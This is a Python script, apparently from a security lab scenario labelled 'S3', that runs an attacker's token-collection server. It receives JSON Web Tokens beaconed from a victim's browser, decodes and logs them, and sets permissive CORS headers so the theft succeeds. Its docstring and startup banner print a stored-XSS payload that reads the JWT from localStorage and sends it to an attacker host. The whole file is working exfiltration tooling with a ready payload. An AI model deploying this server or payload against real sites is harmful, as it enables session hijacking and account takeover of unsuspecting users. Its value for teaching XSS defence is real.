#!/usr/bin/env python3
"""
S3 — Attacker token-collection server
======================================
A minimal HTTP server that logs JWTs received via the ?t= query parameter.
This simulates the attacker-controlled endpoint that the XSS payload beacons to.

XSS payload (paste into the "Public notes" field):
    <script>fetch('http://localhost:8888/?t='+localStorage.getItem('jwt'))</script>

Usage
-----
    python attacker/steal_token_server.py [--port 8888] [--log tokens.log]

Every inbound request URL is printed to stdout and optionally written to a log file.
The decoded JWT payload (claims) is also printed for immediate readability.
"""

import argparse
import base64
import http.server
import json
import logging
import sys
import urllib.parse
from datetime import datetime, timezone


class TokenHandler(http.server.BaseHTTPRequestHandler):
    log_file: str | None = None

    def do_GET(self) -> None:  # noqa: N802
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        token = params.get("t", [None])[0]

        timestamp = datetime.now(timezone.utc).isoformat()
        client_ip = self.client_address[0]

        print()
        print("=" * 60)
        print(f"[{timestamp}] Connection from {client_ip}")
        print(f"Request path: {self.path}")

        if token:
            print()
            print(">>> EXFILTRATED JWT <<<")
            print(token)
            print()
            # Decode payload section (no signature verification — attacker reads claims only)
            try:
                parts = token.split(".")
                padding = "=" * (4 - len(parts[1]) % 4)
                payload_bytes = base64.urlsafe_b64decode(parts[1] + padding)
                claims = json.loads(payload_bytes)
                print("Decoded claims:")
                print(json.dumps(claims, indent=2))
            except Exception as exc:
                print(f"(Could not decode payload: {exc})")

            if self.log_file:
                with open(self.log_file, "a") as f:
                    f.write(f"{timestamp}|{client_ip}|{token}\n")
                print(f"\nToken saved to {self.log_file}")
        else:
            print("(No ?t= parameter in request — no token captured)")

        print("=" * 60)

        # Respond with CORS headers so the XSS fetch() succeeds cross-origin
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args) -> None:  # suppress default access log
        pass


def main() -> None:
    parser = argparse.ArgumentParser(description="S3 attacker token-collection server")
    parser.add_argument("--port", type=int, default=8888, help="Port to listen on (default: 8888)")
    parser.add_argument("--log", default=None, help="File to append captured tokens to")
    args = parser.parse_args()

    TokenHandler.log_file = args.log

    server = http.server.HTTPServer(("0.0.0.0", args.port), TokenHandler)
    print(f"[S3] Token-collection server listening on port {args.port}")
    print(f"     Inject this payload into the Public Notes field:")
    print()
    print(f"     <script>fetch('http://<attacker-ip>:{args.port}/?t='+localStorage.getItem('jwt'))</script>")
    print()
    print("     Waiting for incoming tokens…")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
        sys.exit(0)


if __name__ == "__main__":
    main()
